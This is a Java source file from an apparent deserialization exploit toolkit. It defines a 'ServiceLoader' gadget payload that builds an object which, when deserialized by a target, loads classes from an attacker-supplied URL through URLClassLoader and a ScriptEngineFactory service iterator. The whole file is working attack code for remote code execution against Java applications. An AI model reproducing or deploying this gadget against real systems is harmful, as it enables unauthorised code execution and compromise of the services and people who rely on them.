package com.qi4l.JYso.gadgets;

import javax.script.ScriptEngineFactory;

public class ServiceLoader implements  ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        UtilFactory uf = new UtilFactory();
        String args[] = {command};

        return makeServiceLoader(uf, args);
    }
    public static Object makeServiceLoader ( UtilFactory uf, String[] args ) throws Exception {
        return uf.makeIteratorTrigger(JDKUtil.makeServiceIterator(JDKUtil.makeURLClassLoader(args[0]), ScriptEngineFactory.class));
    }
}
